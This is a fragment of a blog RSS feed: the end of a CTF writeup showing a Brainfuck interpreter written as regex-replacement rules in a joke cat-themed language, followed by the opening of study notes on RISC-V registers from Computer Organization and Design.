<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,79🌚)】替换成【O\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,80🌚)】替换成【P\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,81🌚)】替换成【Q\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,82🌚)】替换成【R\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,83🌚)】替换成【S\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,84🌚)】替换成【T\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,85🌚)】替换成【U\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,86🌚)】替换成【V\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,87🌚)】替换成【W\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,88🌚)】替换成【X\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,89🌚)】替换成【Y\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,90🌚)】替换成【Z\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,91🌚)】替换成【[\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,92🌚)】替换成【\\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,93🌚)】替换成【]\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,94🌚)】替换成【^\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,95🌚)】替换成【_\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,96🌚)】替换成【`\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,97🌚)】替换成【a\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,98🌚)】替换成【b\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,99🌚)】替换成【c\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,100🌚)】替换成【d\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,101🌚)】替换成【e\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,102🌚)】替换成【f\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,103🌚)】替换成【g\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,104🌚)】替换成【h\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,105🌚)】替换成【i\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,106🌚)】替换成【j\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,107🌚)】替换成【k\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,108🌚)】替换成【l\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,109🌚)】替换成【m\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,110🌚)】替换成【n\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,111🌚)】替换成【o\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,112🌚)】替换成【p\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,113🌚)】替换成【q\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,114🌚)】替换成【r\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,115🌚)】替换成【s\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,116🌚)】替换成【t\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,117🌚)】替换成【u\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,118🌚)】替换成【v\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,119🌚)】替换成【w\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,120🌚)】替换成【x\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,121🌚)】替换成【y\1】喵</span></span>
<span><span style="color: #d6deeb">    把【(🎉[\s\S]*,122🌚)】替换成【z\1】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">左括号喵：</span></span>
<span><span style="color: #d6deeb">    如果没看到【,0🌚】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(a.*?A)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(b.*?B)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(c.*?C)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(d.*?D)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(e.*?E)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(f.*?F)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(g.*?G)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🤔(h.*?H)】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    把【🙂】替换成【🤔】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【判断喵】喵</span></span>
<span><span style="color: #d6deeb">右括号喵：</span></span>
<span><span style="color: #d6deeb">    如果看到【,0🌚】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #d6deeb">    把【a([^A]*)🤔A】替换成【a🙂\1A】喵</span></span>
<span><span style="color: #d6deeb">    把【b([^B]*)🤔B】替换成【b🙂\1B】喵</span></span>
<span><span style="color: #d6deeb">    把【c([^C]*)🤔C】替换成【c🙂\1C】喵</span></span>
<span><span style="color: #d6deeb">    把【d([^D]*)🤔D】替换成【d🙂\1D】喵</span></span>
<span><span style="color: #d6deeb">    把【e([^E]*)🤔E】替换成【e🙂\1E】喵</span></span>
<span><span style="color: #d6deeb">    把【f([^F]*)🤔F】替换成【f🙂\1F】喵</span></span>
<span><span style="color: #d6deeb">    把【g([^G]*)🤔G】替换成【g🙂\1G】喵</span></span>
<span><span style="color: #d6deeb">    把【h([^H]*)🤔H】替换成【h🙂\1H】喵</span></span>
<span><span style="color: #d6deeb">    把【🙂】替换成【🤔】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【^】就跳转到【判断喵】喵</span></span>
<span><span style="color: #d6deeb">下一条指令喵：</span></span>
<span><span style="color: #d6deeb">    把【🤔(.)】替换成【\1🤔】喵</span></span>
<span><span style="color: #d6deeb">判断喵：</span></span>
<span><span style="color: #d6deeb">    如果没看到【🤔$】就跳转到【循环喵】喵</span></span>
<span><span style="color: #d6deeb">    把【🎉[\s\S]*】替换成【】喵</span></span>
<span><span style="color: #d6deeb">结束喵：</span></span>
<span><span style="color: #d6deeb">    谢谢喵</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">    重复把【[^&gt;&lt;\+-\.\[\]]】替换成【】喵</span></span>
<span><span style="color: #403f53">    如果看到【^$】就跳转到【结束喵】喵</span></span>
<span><span style="color: #403f53">    把【^】替换成【🤔】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]aA]*)\]】替换成【a\1A】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]bB]*)\]】替换成【b\1B】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]cC]*)\]】替换成【c\1C】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]dD]*)\]】替换成【d\1D】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]eE]*)\]】替换成【e\1E】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]fF]*)\]】替换成【f\1F】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]gG]*)\]】替换成【g\1G】喵</span></span>
<span><span style="color: #403f53">    重复把【\[([^\[\]hH]*)\]】替换成【h\1H】喵</span></span>
<span><span style="color: #403f53">    把【^】替换成【🎉\n,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0🌚,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n】喵</span></span>
<span><span style="color: #403f53">循环喵：</span></span>
<span><span style="color: #403f53">    如果看到【🤔&gt;】就跳转到【向右喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔&lt;】就跳转到【向左喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔\+】就跳转到【加一喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔-】就跳转到【减一喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔\.】就跳转到【输出喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔[a-h]】就跳转到【左括号喵】喵</span></span>
<span><span style="color: #403f53">    如果看到【🤔[A-H]】就跳转到【右括号喵】喵</span></span>
<span><span style="color: #403f53">向右喵：</span></span>
<span><span style="color: #403f53">    把【🌚(,\d+)】替换成【\1🌚】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">向左喵：</span></span>
<span><span style="color: #403f53">    把【(,\d+)🌚】替换成【🌚\1】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">加一喵：</span></span>
<span><span style="color: #403f53">    把【0🌚】替换成【1🌝】喵</span></span>
<span><span style="color: #403f53">    把【1🌚】替换成【2🌝】喵</span></span>
<span><span style="color: #403f53">    把【2🌚】替换成【3🌝】喵</span></span>
<span><span style="color: #403f53">    把【3🌚】替换成【4🌝】喵</span></span>
<span><span style="color: #403f53">    把【4🌚】替换成【5🌝】喵</span></span>
<span><span style="color: #403f53">    把【5🌚】替换成【6🌝】喵</span></span>
<span><span style="color: #403f53">    把【6🌚】替换成【7🌝】喵</span></span>
<span><span style="color: #403f53">    把【7🌚】替换成【8🌝】喵</span></span>
<span><span style="color: #403f53">    把【8🌚】替换成【9🌝】喵</span></span>
<span><span style="color: #403f53">    把【,9🌚】替换成【,10🌝】喵</span></span>
<span><span style="color: #403f53">    把【09🌚】替换成【10🌝】喵</span></span>
<span><span style="color: #403f53">    把【19🌚】替换成【20🌝】喵</span></span>
<span><span style="color: #403f53">    把【29🌚】替换成【30🌝】喵</span></span>
<span><span style="color: #403f53">    把【39🌚】替换成【40🌝】喵</span></span>
<span><span style="color: #403f53">    把【49🌚】替换成【50🌝】喵</span></span>
<span><span style="color: #403f53">    把【59🌚】替换成【60🌝】喵</span></span>
<span><span style="color: #403f53">    把【69🌚】替换成【70🌝】喵</span></span>
<span><span style="color: #403f53">    把【79🌚】替换成【80🌝】喵</span></span>
<span><span style="color: #403f53">    把【89🌚】替换成【90🌝】喵</span></span>
<span><span style="color: #403f53">    把【,99🌚】替换成【,100🌝】喵</span></span>
<span><span style="color: #403f53">    把【099🌚】替换成【100🌝】喵</span></span>
<span><span style="color: #403f53">    把【199🌚】替换成【200🌝】喵</span></span>
<span><span style="color: #403f53">    把【299🌚】替换成【300🌝】喵</span></span>
<span><span style="color: #403f53">    把【399🌚】替换成【400🌝】喵</span></span>
<span><span style="color: #403f53">    把【499🌚】替换成【500🌝】喵</span></span>
<span><span style="color: #403f53">    把【599🌚】替换成【600🌝】喵</span></span>
<span><span style="color: #403f53">    把【699🌚】替换成【700🌝】喵</span></span>
<span><span style="color: #403f53">    把【799🌚】替换成【800🌝】喵</span></span>
<span><span style="color: #403f53">    把【899🌚】替换成【900🌝】喵</span></span>
<span><span style="color: #403f53">    把【🌝】替换成【🌚】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">减一喵：</span></span>
<span><span style="color: #403f53">    把【1🌚】替换成【0🌝】喵</span></span>
<span><span style="color: #403f53">    把【2🌚】替换成【1🌝】喵</span></span>
<span><span style="color: #403f53">    把【3🌚】替换成【2🌝】喵</span></span>
<span><span style="color: #403f53">    把【4🌚】替换成【3🌝】喵</span></span>
<span><span style="color: #403f53">    把【5🌚】替换成【4🌝】喵</span></span>
<span><span style="color: #403f53">    把【6🌚】替换成【5🌝】喵</span></span>
<span><span style="color: #403f53">    把【7🌚】替换成【6🌝】喵</span></span>
<span><span style="color: #403f53">    把【8🌚】替换成【7🌝】喵</span></span>
<span><span style="color: #403f53">    把【9🌚】替换成【8🌝】喵</span></span>
<span><span style="color: #403f53">    把【,10🌚】替换成【,9🌝】喵</span></span>
<span><span style="color: #403f53">    把【10🌚】替换成【09🌝】喵</span></span>
<span><span style="color: #403f53">    把【20🌚】替换成【19🌝】喵</span></span>
<span><span style="color: #403f53">    把【30🌚】替换成【29🌝】喵</span></span>
<span><span style="color: #403f53">    把【40🌚】替换成【39🌝】喵</span></span>
<span><span style="color: #403f53">    把【50🌚】替换成【49🌝】喵</span></span>
<span><span style="color: #403f53">    把【60🌚】替换成【59🌝】喵</span></span>
<span><span style="color: #403f53">    把【70🌚】替换成【69🌝】喵</span></span>
<span><span style="color: #403f53">    把【80🌚】替换成【79🌝】喵</span></span>
<span><span style="color: #403f53">    把【90🌚】替换成【89🌝】喵</span></span>
<span><span style="color: #403f53">    把【,100🌚】替换成【,99🌝】喵</span></span>
<span><span style="color: #403f53">    把【100🌚】替换成【099🌝】喵</span></span>
<span><span style="color: #403f53">    把【200🌚】替换成【199🌝】喵</span></span>
<span><span style="color: #403f53">    把【300🌚】替换成【299🌝】喵</span></span>
<span><span style="color: #403f53">    把【400🌚】替换成【399🌝】喵</span></span>
<span><span style="color: #403f53">    把【500🌚】替换成【499🌝】喵</span></span>
<span><span style="color: #403f53">    把【600🌚】替换成【599🌝】喵</span></span>
<span><span style="color: #403f53">    把【700🌚】替换成【699🌝】喵</span></span>
<span><span style="color: #403f53">    把【800🌚】替换成【799🌝】喵</span></span>
<span><span style="color: #403f53">    把【900🌚】替换成【899🌝】喵</span></span>
<span><span style="color: #403f53">    把【🌝】替换成【🌚】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">输出喵：</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,32🌚)】替换成【 \1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,33🌚)】替换成【!\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,34🌚)】替换成【&quot;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,35🌚)】替换成【#\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,36🌚)】替换成【$\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,37🌚)】替换成【%\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,38🌚)】替换成【&amp;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,39🌚)】替换成【&#39;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,40🌚)】替换成【(\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,41🌚)】替换成【)\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,42🌚)】替换成【*\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,43🌚)】替换成【+\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,44🌚)】替换成【,\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,45🌚)】替换成【-\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,46🌚)】替换成【.\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,47🌚)】替换成【/\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,48🌚)】替换成【0\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,49🌚)】替换成【1\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,50🌚)】替换成【2\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,51🌚)】替换成【3\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,52🌚)】替换成【4\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,53🌚)】替换成【5\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,54🌚)】替换成【6\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,55🌚)】替换成【7\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,56🌚)】替换成【8\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,57🌚)】替换成【9\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,58🌚)】替换成【:\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,59🌚)】替换成【;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,60🌚)】替换成【&lt;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,61🌚)】替换成【=\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,62🌚)】替换成【&gt;\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,63🌚)】替换成【?\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,64🌚)】替换成【@\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,65🌚)】替换成【A\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,66🌚)】替换成【B\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,67🌚)】替换成【C\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,68🌚)】替换成【D\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,69🌚)】替换成【E\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,70🌚)】替换成【F\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,71🌚)】替换成【G\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,72🌚)】替换成【H\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,73🌚)】替换成【I\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,74🌚)】替换成【J\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,75🌚)】替换成【K\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,76🌚)】替换成【L\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,77🌚)】替换成【M\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,78🌚)】替换成【N\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,79🌚)】替换成【O\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,80🌚)】替换成【P\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,81🌚)】替换成【Q\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,82🌚)】替换成【R\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,83🌚)】替换成【S\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,84🌚)】替换成【T\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,85🌚)】替换成【U\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,86🌚)】替换成【V\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,87🌚)】替换成【W\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,88🌚)】替换成【X\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,89🌚)】替换成【Y\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,90🌚)】替换成【Z\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,91🌚)】替换成【[\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,92🌚)】替换成【\\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,93🌚)】替换成【]\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,94🌚)】替换成【^\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,95🌚)】替换成【_\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,96🌚)】替换成【`\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,97🌚)】替换成【a\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,98🌚)】替换成【b\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,99🌚)】替换成【c\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,100🌚)】替换成【d\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,101🌚)】替换成【e\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,102🌚)】替换成【f\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,103🌚)】替换成【g\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,104🌚)】替换成【h\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,105🌚)】替换成【i\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,106🌚)】替换成【j\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,107🌚)】替换成【k\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,108🌚)】替换成【l\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,109🌚)】替换成【m\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,110🌚)】替换成【n\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,111🌚)】替换成【o\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,112🌚)】替换成【p\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,113🌚)】替换成【q\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,114🌚)】替换成【r\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,115🌚)】替换成【s\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,116🌚)】替换成【t\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,117🌚)】替换成【u\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,118🌚)】替换成【v\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,119🌚)】替换成【w\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,120🌚)】替换成【x\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,121🌚)】替换成【y\1】喵</span></span>
<span><span style="color: #403f53">    把【(🎉[\s\S]*,122🌚)】替换成【z\1】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">左括号喵：</span></span>
<span><span style="color: #403f53">    如果没看到【,0🌚】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">    把【🤔(a.*?A)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(b.*?B)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(c.*?C)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(d.*?D)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(e.*?E)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(f.*?F)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(g.*?G)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🤔(h.*?H)】替换成【\1🙂】喵</span></span>
<span><span style="color: #403f53">    把【🙂】替换成【🤔】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【判断喵】喵</span></span>
<span><span style="color: #403f53">右括号喵：</span></span>
<span><span style="color: #403f53">    如果看到【,0🌚】就跳转到【下一条指令喵】喵</span></span>
<span><span style="color: #403f53">    把【a([^A]*)🤔A】替换成【a🙂\1A】喵</span></span>
<span><span style="color: #403f53">    把【b([^B]*)🤔B】替换成【b🙂\1B】喵</span></span>
<span><span style="color: #403f53">    把【c([^C]*)🤔C】替换成【c🙂\1C】喵</span></span>
<span><span style="color: #403f53">    把【d([^D]*)🤔D】替换成【d🙂\1D】喵</span></span>
<span><span style="color: #403f53">    把【e([^E]*)🤔E】替换成【e🙂\1E】喵</span></span>
<span><span style="color: #403f53">    把【f([^F]*)🤔F】替换成【f🙂\1F】喵</span></span>
<span><span style="color: #403f53">    把【g([^G]*)🤔G】替换成【g🙂\1G】喵</span></span>
<span><span style="color: #403f53">    把【h([^H]*)🤔H】替换成【h🙂\1H】喵</span></span>
<span><span style="color: #403f53">    把【🙂】替换成【🤔】喵</span></span>
<span><span style="color: #403f53">    如果看到【^】就跳转到【判断喵】喵</span></span>
<span><span style="color: #403f53">下一条指令喵：</span></span>
<span><span style="color: #403f53">    把【🤔(.)】替换成【\1🤔】喵</span></span>
<span><span style="color: #403f53">判断喵：</span></span>
<span><span style="color: #403f53">    如果没看到【🤔$】就跳转到【循环喵】喵</span></span>
<span><span style="color: #403f53">    把【🎉[\s\S]*】替换成【】喵</span></span>
<span><span style="color: #403f53">结束喵：</span></span>
<span><span style="color: #403f53">    谢谢喵</span></span></samp></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/filtered-flag3.545cdd7a.webp"><img srcset="/assets/filtered-flag3.dc5f4fbf.png" loading="lazy" src="/assets/filtered-flag3.dc5f4fbf.png" width="559" height="135" alt="flag3 喵"></picture></p>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/writeup">writeup</category>
            <category domain="https://ouuan.moe/tag/ctf">ctf</category>
        </item>
        <item>
            <title><![CDATA[Computer Organization and Design 第二章学习笔记]]></title>
            <link>https://ouuan.moe/post/2023/09/cod-2</link>
            <guid>https://ouuan.moe/post/2023/09/cod-2</guid>
            <pubDate>Tue, 10 Oct 2023 15:35:55 GMT</pubDate>
            <description><![CDATA[<p><span class="mojikumi-line-start">《</span>Computer Organization and Design RISC-V Edition: The Hardware/Software Interface (2nd Edition)<span class="mojikumi-line-end">》</span>第二章 <span class="mojikumi">“</span>Instructions: Language of the Computer<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[<p><span class="mojikumi-line-start">《</span>Computer Organization and Design RISC-V Edition: The Hardware/Software Interface (2nd Edition)<span class="mojikumi-line-end">》</span>第二章 <span class="mojikumi">“</span>Instructions: Language of the Computer<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>

<p>主要是在讲 RISC-V<span class="mojikumi-line-end">。</span>可以参考 <a href="https://riscv.org/technical/specifications/">Specifications – RISC-V International</a><span class="mojikumi-line-start">（</span>比 x86 短多了<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>P.S. 其他书我是认真看了第一章但懒得写<span class="mojikumi-line-end">，</span>这本<span class="mojikumi-line-start">（</span>如果看过 CS:APP 的话<span class="mojikumi-line-end">）</span>建议直接跳过第一章<span class="mojikumi-line-start">（</span></p>
<h2 id="registers" class="heading"><a href="#registers" class="heading-anchor" aria-label="章节： Registers" tabindex="-1"></a><span>Registers</span></h2>
<p>RISC-V (RV32) 的 register 是 32-bit 的<span class="mojikumi-line-end">，</span>而 32-bit 称作一个 word<span class="mojikumi-line-start">（</span>与 x86 不同<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>有 32 个 register<span class="mojikumi-line-end">，</span>用 <code>x0</code>~<code>x31</code> 来标识<span class="mojikumi-line-end">，</span>每个 register 根据其功能还有一个<span class="mojikumi-line-start">（</span>或多个<span class="mojikumi-line-end">）</span>别名<span class="mojikumi-line-end">。</span></p>
<p><code>x0</code> / <code>zero</code> 的值固定为 0<span class="mojikumi-line-end">，</span>能起到很多作用<span class="mojikumi-line-end">，</span>例如在 <code>sub</code> 中作为被减数来取负<span class="mojikumi-line-end">、</span>作为 destination 来丢弃结果<span class="mojikumi-line-end">、</span>在 conditional branch<span class="mojikumi-line-start">（</span>不接受 immediate<span class="mojikumi-line-end">）</span>中作为比较的参数<span class="mojikumi-line-end">。</span></p>
<p>其他寄存器在硬件层面上没有区别<span class="mojikumi-line-end">，</span>但有用于 procedure 的 convention<span class="mojikumi-line-end">：</span></p>
<ul>
<li>
<p><code>x1</code> / <code>ra</code> 是 return address<span class="mojikumi-line-start">（</span>call 是 <code>jal x1, foo</code><span class="mojikumi-line-end">，</span>return 是 <code>jalr x0, 0(x1)</code><span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
</li>
<li>
